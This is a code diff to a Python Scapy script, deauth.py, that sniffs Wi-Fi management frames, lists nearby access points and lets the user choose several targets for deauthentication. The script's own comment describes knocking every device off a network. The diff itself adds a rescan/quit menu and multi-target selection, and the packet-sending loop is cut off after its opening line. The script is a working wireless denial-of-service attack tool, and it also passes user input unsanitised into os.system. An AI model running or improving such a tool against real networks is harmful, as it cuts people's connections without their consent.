@@ -9,17 +9,20 @@ import os
 
 client = "FF:FF:FF:FF:FF:FF" # Use FF:FF:FF:FF:FF:FF to deauth everyone on that network. Use a specific mac address to only deauth a certain device
 found = {}
+aps = []
 
 if len(sys.argv) < 2:
   print("usage: deauth.py <iface>")
   sys.exit(-1)
 conf.iface = sys.argv[1]
 
+os.system("clear")
+
 # WARNING: The following channel selection code only works on mac. Remove to make the code linux compatible.
 # Select channel
 channel = ""
 while channel.isdigit() != True:
-  channel = input("Channel to use: ")
+  channel = input("channel to use : ")
 os.system("nohup /System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport " + conf.iface + " sniff " + channel + " &")
 time.sleep(0.5)
 
@@ -32,34 +35,44 @@ def sniffmgmt(p):
     key = "%s" % (p.addr2)
     found[key] = probe
 
-# Capture n number of packets and use them to generate a list of available APs, their mac addresses and their SSIDs
-n = ""
-while n.isdigit() != True:
-  n = input("Number of packets to capture: ")
-n = int(n)
+def discover():
+  global aps
+  global probe_list
+  # Capture n number of packets and use them to generate a list of available APs, their mac addresses and their SSIDs
+  n = ""
+  while n.isdigit() != True:
+    n = input("number of packets to capture : ")
+  n = int(n)
 
-sniff(iface=conf.iface, prn=sniffmgmt, monitor=True, count=n)
+  sniff(iface=conf.iface, prn=sniffmgmt, monitor=True, count=n)
 
-probe_list = []
+  probe_list = []
 
-# Make an array version of found so that each AP has a number associated with it for the user to choose
-for key,probe in found.items():
-  item = [key,probe]
-  probe_list.append(item)
+  # Make an array version of found so that each AP has a number associated with it for the user to choose
+  for key,probe in found.items():
+    item = [key,probe]
+    probe_list.append(item)
 
-# Print out the list of discovered APs and their index so that the user can choose one
-for i in range(len(probe_list)):
-  item = probe_list[i]
-  print(str(i) + " : " + str(item[1]["ssid"])[2:-1] + " : " + item[1]["cli"])
+  # Print out the list of discovered APs and their index so that the user can choose one
+  for i in range(len(probe_list)):
+    item = probe_list[i]
+    print(str(i) + " : " + str(item[1]["ssid"])[2:-1] + " : " + item[1]["cli"])
 
-# Get & process user input
-n = ""
-while n.replace(",", "").isdigit() != True:
-  n = input("AP number to be deauthed: ")
-# n = int(n)
+  # Get & process user input
+  n = ""
+  while n.replace(",", "").isdigit() != True:
+    n = input("target (r - rescan, q - quit, use commas to seperate multiple APs) : ")
+    if n == "r":
+      os.system("clear")
+      discover()
+      return
+    elif n == "q":
+      sys.exit()
+  # n = int(n)
 
-aps = list(map(int, n.split(",")))
-print(aps)
+  aps = list(map(int, n.split(",")))
+
+discover()
 
 # Send packets forever
 while True:
